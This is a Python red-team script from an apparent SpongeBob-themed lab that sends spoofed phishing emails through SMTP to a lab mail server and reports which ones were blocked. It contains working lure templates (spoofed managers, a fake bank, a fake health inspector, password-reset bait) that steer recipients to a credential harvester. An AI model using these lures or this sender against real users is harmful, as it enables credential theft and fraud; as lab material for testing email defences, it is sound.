#!/usr/bin/env python3
# =====================================================================
# plankton_phish_demo.py
# Krusty Krab Red Team Phishing Demonstration
# Run from redTeamXUVM to demonstrate email-based attack blocking.
#
# USAGE:
#   python3 plankton_phish_demo.py
#
# EDIT BEFORE RUNNING:
#   MAIL_SERVER  - KK-DC IP
#   REDTEAM_IP   - redTeamXUVM IP (harvester)
# =====================================================================

import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ---- EDIT THESE ----
MAIL_SERVER  = "10.8.0.10"   # KK-DC IP
MAIL_PORT    = 25
REDTEAM_IP   = "10.8.0.5"    # redTeamXUVM IP
# --------------------

results = []

def send(label, from_addr, to_addr, subject, body):
    msg = MIMEMultipart()
    msg["From"]    = from_addr
    msg["To"]      = to_addr
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))
    try:
        s = smtplib.SMTP(MAIL_SERVER, MAIL_PORT, timeout=5)
        s.sendmail(from_addr, [to_addr], msg.as_string())
        s.quit()
        print(f"  [SENT]    {label}")
        results.append((label, "SENT - not blocked"))
    except Exception as e:
        print(f"  [BLOCKED] {label} -- {e}")
        results.append((label, f"BLOCKED -- {e}"))
    time.sleep(1)


print()
print("=" * 60)
print("  Krusty Krab Phishing Demonstration - Plankton Attack")
print("=" * 60)
print(f"  Target mail server : {MAIL_SERVER}:{MAIL_PORT}")
print(f"  Harvester          : http://{REDTEAM_IP}/login")
print("=" * 60)
print()

# =====================================================================
# CATEGORY 1: Internal address spoofing
# Plankton pretends to be a trusted internal sender
# =====================================================================
print("[*] Category 1: Internal Address Spoofing")

send(
    label     = "Spoofed Mr. Krabs -> SpongeBob (authority + urgency)",
    from_addr = "eugene.krabs@krustykrab.local",
    to_addr   = "spongebob.squarepants@krustykrab.local",
    subject   = "URGENT: Intranet Security Verification Required",
    body      = f"""SpongeBob,

Our IT system has flagged your account for mandatory re-verification following a security audit. You must confirm your identity before end of business today or your access will be suspended.

Please verify your account immediately:
http://10.8.0.5/login

Do not discuss this with other staff - the audit is confidential.

- Mr. Krabs"""
)

send(
    label     = "Spoofed Sandy -> Squidward (flattery + ego)",
    from_addr = "sandy.cheeks@krustykrab.local",
    to_addr   = "squidward.tentacles@krustykrab.local",
    subject   = "Re: Employee of the Month Portal - Your Nomination",
    body      = f"""Squidward,

You have been nominated for Employee of the Month by management. To accept your nomination and have your profile featured on the staff portal, please log in to confirm your details:

http://10.8.0.5/login

Nominations close tonight - please act quickly. Congratulations!

- Sandy, IT"""
)


# =====================================================================
# CATEGORY 2: External sender spoofing
# Plankton pretends to be a legitimate external authority
# =====================================================================
print()
print("[*] Category 2: External Authority Spoofing")

send(
    label     = "Fake health inspector -> Krabs (regulatory fear)",
    from_addr = "inspector.jenkins@bikinibottomhealth.gov",
    to_addr   = "eugene.krabs@krustykrab.local",
    subject   = "Notice of Unannounced Inspection - Compliance Documentation Required",
    body      = """Dear Mr. Krabs,

This office has received a complaint regarding food safety practices at the Krusty Krab. An unannounced inspection is scheduled within 48 hours.

To avoid citation, please reply with your current staff roster, their roles, and emergency contact information so our inspector can prepare documentation.

Failure to comply may result in temporary closure.

- Office of Inspector Jenkins
Bikini Bottom Health Department"""
)

send(
    label     = "Fake MailEnable support -> Sandy (technical lure)",
    from_addr = "support@mailenablesupport.com",
    to_addr   = "sandy.cheeks@krustykrab.local",
    subject   = "MailEnable Server Alert: Certificate Expiry - Action Required",
    body      = f"""Sandy,

The SSL certificate for mail.krustykrab.local expires in 48 hours. All staff email will stop functioning if not renewed.

Please log into the mail server administration portal to renew:

http://10.8.0.5/login

Use your domain administrator credentials to access the panel.

MailEnable Server Monitor"""
)

send(
    label     = "Fake bank -> Krabs (financial lure)",
    from_addr = "security@bikinibank.com",
    to_addr   = "eugene.krabs@krustykrab.local",
    subject   = "Urgent: Suspicious Transaction Detected on Business Account",
    body      = f"""Dear Eugene Krabs,

We have detected a suspicious transaction of $9,847.00 on your Krusty Krab business account. Your account has been temporarily limited.

Please verify your identity immediately to restore access:

http://10.8.0.5/login

Failure to verify within 24 hours will result in account suspension.

Bikini Bottom Bank Security Team"""
)

# =====================================================================
# CATEGORY 3: Display name spoofing
# Real external domain, display name looks internal
# =====================================================================
print()
print("[*] Category 3: Display Name Spoofing")

send(
    label     = "Display name spoof - 'Mr. Krabs' from external domain",
    from_addr = '"Mr. Krabs" <eugene.krabs@chum-bucket.com>',
    to_addr   = "spongebob.squarepants@krustykrab.local",
    subject   = "Confidential: Secret Formula Backup Required",
    body      = f"""SpongeBob,

I need you to log into the backup portal and verify the secret formula document is properly saved. This is urgent - do not tell anyone.

http://10.8.0.5/login

- Mr. Krabs"""
)

send(
    label     = "Display name spoof - 'Sandy IT Support' from external",
    from_addr = '"Sandy Cheeks - IT Support" <helpdesk@kk-support.com>',
    to_addr   = "squidward.tentacles@krustykrab.local",
    subject   = "Your Account Password Expires Tonight",
    body      = f"""Squidward,

Your domain account password expires at midnight tonight. To avoid being locked out, please update it now through the self-service portal:

http://10.8.0.5/login

- Sandy Cheeks
IT Support"""
)


# =====================================================================
# CATEGORY 4: Generic spam/malware lures
# =====================================================================
print()
print("[*] Category 4: Generic Spam and Malware Lures")

send(
    label     = "Prize/reward lure -> SpongeBob",
    from_addr = "prizes@bikinimail.com",
    to_addr   = "spongebob.squarepants@krustykrab.local",
    subject   = "You have won a Krabby Patty Gift Basket!",
    body      = f"""Congratulations SpongeBob!

You have been selected as the winner of our monthly employee appreciation prize. Claim your Krabby Patty Gift Basket by logging in here:

http://10.8.0.5/login

Prize must be claimed within 24 hours.

- Krusty Krab Rewards"""
)

send(
    label     = "Fake invoice -> Krabs (financial bait)",
    from_addr = "billing@seafood-suppliers.com",
    to_addr   = "eugene.krabs@krustykrab.local",
    subject   = "Invoice #KK-2026-0317 - Payment Overdue",
    body      = f"""Dear Mr. Krabs,

Invoice #KK-2026-0317 for $4,200.00 is now 30 days overdue. To avoid late fees and service interruption, please log in to review and pay:

http://10.8.0.5/login

- Bikini Bottom Seafood Suppliers"""
)

send(
    label     = "Password reset lure -> Sandy",
    from_addr = "noreply@krustykrab-portal.com",
    to_addr   = "sandy.cheeks@krustykrab.local",
    subject   = "Password Reset Request for sandy.cheeks@krustykrab.local",
    body      = f"""A password reset was requested for your account.

Click below to reset your password. This link expires in 15 minutes:

http://10.8.0.5/login

If you did not request this, your account may be compromised. Log in immediately to secure it.

- Krusty Krab IT"""
)

# =====================================================================
# RESULTS SUMMARY
# =====================================================================
print()
print("=" * 60)
print("  RESULTS SUMMARY")
print("=" * 60)
sent    = [r for r in results if "SENT" in r[1]]
blocked = [r for r in results if "BLOCKED" in r[1]]
print(f"  Total attempts : {len(results)}")
print(f"  Sent (reached mail server) : {len(sent)}")
print(f"  Blocked (firewall/rejected): {len(blocked)}")
print()
if sent:
    print("  REACHED MAIL SERVER:")
    for label, result in sent:
        print(f"    - {label}")
if blocked:
    print("  BLOCKED:")
    for label, result in blocked:
        print(f"    - {label}")
print("=" * 60)
print()
